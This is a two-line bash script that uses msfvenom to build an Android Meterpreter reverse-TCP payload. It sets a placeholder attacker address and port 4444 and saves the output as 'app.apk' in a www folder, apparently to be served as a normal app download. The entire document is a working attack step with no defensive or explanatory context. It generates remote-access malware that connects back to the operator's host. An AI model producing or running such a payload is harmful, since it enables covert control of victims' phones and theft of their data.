#!/bin/bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=YOURIP LPORT=4444 -o www/app.apk
